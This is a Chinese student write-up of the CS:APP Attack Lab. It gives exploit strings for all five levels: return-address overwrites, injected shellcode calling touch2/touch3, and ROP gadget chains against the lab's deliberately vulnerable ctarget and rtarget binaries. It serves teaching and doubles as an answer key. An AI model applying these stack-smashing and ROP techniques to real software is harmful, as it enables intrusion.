# 实验目标

通过构造五种不同的攻击字符串（exploit strings），利用两个程序（ctarget 和 rtarget）中的缓冲区溢出漏洞，完成五个不同难度的攻击任务。

# 文件说明

- `ctarget`：容易受到**代码注入攻击**的程序。
- `rtarget`：容易受到**返回导向编程攻击**的程序。
- `cookie.txt`：你的唯一标识符（8位十六进制数）。
- `farm.c`：用于 ROP 攻击的“gadget 农场”源码。
- `hex2raw`：将十六进制格式的字符串转换为原始字节的工具。

# 实验流程

分析程序流

构造攻击字符串

通过 hex2raw 转换成二进制文本 : ./hex2raw <input.txt> raw_input.txt

输入攻击字符串 ：./ctarget -qi raw_input.txt (针对ctarget)

![image-20260306165142880](C:\Users\14034\AppData\Roaming\Typora\typora-user-images\image-20260306165142880.png)

# 笔记

## level 1 ：改变程序流向（Touch1）

- **任务**：让`getbuf`函数在执行后不返回`test`函数，转而执行`touch1`函数。
- **攻击思路**：
  1. 找到`getbuf`的缓冲区大小。通过反汇编`getbuf`，发现它分配了`0x28`（即40）字节的栈空间。
  2. 找到`touch1`函数的起始地址，例如`0x4017c0`。
  3. 构造攻击字符串：**前40个字节可以任意填充**，紧接着的8个字节（64位返回地址）用`touch1`的地址（注意**小端法**表示）覆盖。

- **攻击字符串示例** (`phase1.txt`)：

  ```tex
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 /* 任意40字节填充 */
  c0 17 40 00 00 00 00 00 /* touch1的地址，小端法 */
  ```

## level 2: 注入并执行代码 (Touch2)

- **任务**：让程序执行`touch2`函数，并且需要将你的`cookie`值作为参数传递给`touch2`（即设置`%rdi`寄存器为cookie值）。

- **攻击思路**：

  1. 编写注入的汇编代码，将cookie移入`%rdi`并跳转到`touch2`。
  2. 将这段汇编代码的机器码放入缓冲区，并让`getbuf`的返回地址指向这块缓冲区的起始地址。
  3. 确定缓冲区的起始地址（栈顶`%rsp`的值），例如`0x5561dc78`。

- **注入代码示例** (`inject2.s`)：

  ```assembly
  mov    $0x59b997fa, %rdi   # 将你的cookie值放入 %rdi
  pushq  $0x4017ec           # 将touch2的地址压栈
  ret                        # 返转到touch2
  ```

  编译后用`objdump`得到机器码：`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`。

- **攻击字符串布局** (`phase2.txt`)：

  ```
  48 c7 c7 fa 97 b9 59 68
  ec 17 40 00 c3 00 00 00 /* 注入的机器码，共13字节 */
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 /* 填充至40字节 */
  78 dc 61 55 00 00 00 00 /* 返回地址：指向缓冲区开始 */
  ```

## level 3: 传递字符串参数 (Touch3)

- **任务**：让程序执行`touch3`函数，并将你的`cookie`字符串（如`"59b997fa"`）的地址作为参数传递给`touch3`（即设置`%rdi`寄存器为该字符串的地址）。

- **攻击思路**：

  1. **安全存放Cookie字符串**：因为后续函数调用会覆盖缓冲区部分内容，所以**把cookie字符串放在返回地址之后**更安全。
  2. **计算字符串地址**：`getbuf`返回后，`%rsp`指向我们覆盖的返回地址。字符串放在其后，例如在返回地址后第8字节，那么字符串地址就是 `%rsp + 8`。但在注入代码中，我们通常使用**绝对地址**。如果缓冲区起始于`0x5561dc78`，那么字符串可以放在`0x5561dca8`（`0x5561dc78 + 0x30`）。
  3. **注入代码**：将字符串地址赋给`%rdi`，然后跳转到`touch3`。

- **攻击字符串布局** (`phase3.txt`)：

  ```
  /* 注入代码的机器码 */
  48 c7 c7 a8 dc 61 55 68   /* mov $0x5561dca8,%rdi; pushq $0x4018fa */
  fa 18 40 00 c3 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00   /* 填充至40字节 */
  78 dc 61 55 00 00 00 00   /* 返回地址：指向缓冲区开始 (0x5561dc78) */
  35 39 62 39 39 37 66 61   /* cookie字符串 "59b997fa" 的ASCII，注意末尾无\0 */
  00                        /* 字符串结束符 '\0' */
  ```

## level 4: 注入并执行代码 (Touch2)

- **任务**：让程序执行`touch2`函数，并且需要将你的`cookie`值作为参数传递给`touch2`（即设置`%rdi`寄存器为cookie值）。

### 第一步：理解ROP原理

ROP的核心思想：我们不注入新代码，而是在程序已有的代码中寻找以`ret`指令结尾的短指令序列(gadgets)，通过精心构造栈来链式执行这些gadgets。

### 第二步：分析可用gadgets

首先反汇编`rtarget`并查看gadget farm：

```bash
objdump -d rtarget > rtarget.s
```

查看farm区域：

```bash
grep -A 100 '<start_farm>' rtarget.s
```

### 第三步：制定ROP策略

我们需要完成以下操作：

1. 将cookie值放入`%rdi`寄存器
2. 调用`touch2`

由于不能直接`pop %rdi`，常见的策略是：

```
pop %rax → mov %rax, %rdi → touch2
```

### 第四步：寻找gadgets

**寻找pop指令**：

在`rtarget.s`中搜索`58`到`5f`（pop指令的机器码）：

```bash
# 在farm区域搜索pop指令
objdump -d rtarget | grep -B2 -A2 '5[8-9a-f]' | grep -A5 'start_farm'
```

**寻找mov指令**：

搜索将`%rax`移动到`%rdi`的指令：

```bash
objdump -d rtarget | grep -B2 -A2 '48 89 c7'  # mov %rax,%rdi
```

### 第五步：构建ROP链

假设我们找到了以下gadgets（你的实际地址可能不同）：

```
Gadget 1 (pop %rax): 0x4019ab
Gadget 2 (mov %rax, %rdi): 0x4019a2  
touch2地址: 0x4017ec
```

ROP链结构：

```
[缓冲区填充] + [pop_rax地址] + [cookie值] + [mov_rax_rdi地址] + [touch2地址]
```

### 第六步：创建攻击文件

创建`phase4.txt`：

```
/* 40字节缓冲区填充 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* ROP链开始 */
ab 19 40 00 00 00 00 00  /* pop %rax gadget地址 */
fa 97 b9 59 00 00 00 00  /* cookie值: 0x59b997fa */
a2 19 40 00 00 00 00 00  /* mov %rax, %rdi gadget地址 */
ec 17 40 00 00 00 00 00  /* touch2地址 */
```

## level 5 : 传递字符串参数

构造rop链如下

~~~assembly
movq %rsp, %rax
movq %rax, %rdi
pop %rax
#偏移值x
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi
lea (%rdi, %rsi, 1), %rax
mov %rax, %rdi
#touch3 入口地址
#cookie字符串ascii码
~~~

最终攻击字符串如下：

~~~
00 00 00 00 00 00 00 00 #40字节无用字节
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 #movq %rsp, %rax 地址
a2 19 40 00 00 00 00 00 #movq %rax, %rdi 地址
cc 19 40 00 00 00 00 00 #pop %rax 地址
48 00 00 00 00 00 00 00 #偏移值72字节, 具体计算见网址
dd 19 40 00 00 00 00 00 #movl %eax, %edx 地址
34 1a 40 00 00 00 00 00 #movl %edx, %ecx 地址
13 1a 40 00 00 00 00 00 #movl %ecx, %esi 地址
d6 19 40 00 00 00 00 00 #lea(%rdi, %rsi, 1), %rax地址
a2 19 40 00 00 00 00 00 #movq %rax, %rdi 地址
fa 18 40 00 00 00 00 00 #touch3入口地址
35 39 62 39 39 37 66 61 #cookie字符串ascii码
00
~~~

**要点**：有些gadget其实有效（如movl %edx, %ecx)，其后跟着andl, orb, testb, cmp这种不改变寄存器值的指令，不要误以为没用。栈偏移量的计算要理清楚。 栈的结构，指令跳转流程也需理清楚。
